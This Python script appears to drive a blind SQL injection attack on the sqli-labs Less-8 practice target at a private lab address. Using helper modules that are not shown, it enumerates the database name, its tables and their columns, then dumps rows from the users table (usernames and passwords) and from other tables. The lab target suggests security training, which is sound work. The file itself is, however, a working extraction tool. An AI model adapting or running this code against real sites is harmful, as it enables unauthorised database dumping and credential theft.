from Databases import GetDBNameLen, GetDBName
from Tables import GetTableNameLen, GetTableName, GetTableCount
from Field import GetCluName, GetCluCount, GetCluNameLen
from Value import GetValueLen, GetValueCount, GetValue

# 整合一下四大块的功能

def GetDatabase(main_url):
    db_name_len = GetDBNameLen(main_url)
    # print("$ 数据库名长度为" + str(db_name_len) + "\n")

    db_name = GetDBName(main_url, db_name_len)
    print("[-]" + db_name)

    return db_name


def GetTables(main_url, DBName):
    table_list = []          # 将所有查询到的表的名称放在这个列表里
    table_count = GetTableCount(main_url, DBName)      # 表的数量
    # print("$ " + DBName + "数据库里有" + str(table_count) + "个表\n")
    for table in range(table_count):
        table_name_len = GetTableNameLen(main_url, DBName, table+1)
        # print("$ 表名称长度为" + str(table_name_len) + "\n")

        table_name = GetTableName(main_url, DBName, table_name_len, table+1)
        print("[-]" + table_name)

        table_list.append(table_name)
    return table_list


def GetFields(main_url, DBName, TableName):
    fields = []  # 存放所有已查询到的字段
    # print("表"+table+"下的字段")
    field_count = GetCluCount(main_url, DBName, TableName) # 当前表下字段的数量
    for field in range(field_count):
        field_name_len = GetCluNameLen(main_url, DBName, TableName, field+1)
        clu_name = GetCluName(main_url, DBName, TableName, field_name_len, field+1)
        print("[-]"+clu_name)
        fields.append(clu_name)
    return fields


def GetValues(main_url, Fields, TableName):
    values = []
    count = GetValueCount(main_url=main_url, TableName=TableName)  # 几条数据
    if count == 0:
        print("空表")
        return
    for i in range(count):
        for field in Fields:
            value_len = GetValueLen(main_url, TableName, field, i+1)
            value = GetValue(main_url, TableName, field, value_len, i+1)
            print(value, end="   ")
        print()

if __name__ == '__main__':
    main_url = "http://192.168.127.129/sqli-labs/Less-8/"  # 注入的地址
    # 1. 获取sqli-less8所在的数据库
    print("[+]数据库名：")
    databasename = GetDatabase(main_url)
    print("")

    # 2. 获取数据库下的表
    print("[+]%s下的表："%databasename)
    tables = GetTables(main_url, databasename)
    print("")

    # 3. 获取数据表下的字段
    fields = [[0], [0], [0], [0]]
    i = 0
    for table in tables:
        print("[+]表%s"%table+"下的字段：")
        fields[i] = GetFields(main_url, databasename, table)
        i += 1
        print("")

    # 4. 获取数据
    print("查看表中数据：")
    print("1.查看user表数据 2.查看emails表数据 3.查看表uagents数据 4.查看表referers数据")
    n = input()
    if n == "1":
        print("id username password")
        GetValues(main_url, ["id", "username", "password"], "users")
    elif n == "2":
        print("id  email_id")
        GetValues(main_url, ["id", "email_id"], "emails")
    elif n == "3":
        print("表uagents的数据：")
        GetValues(main_url, ["id", "uagent", "ip_address", "username"], "uagents")
    elif n == "4":
        print("表referers数据：")
        GetValues(main_url, ["id", "referer", "ip_address"], "referers")
    else:
        print("无此选项")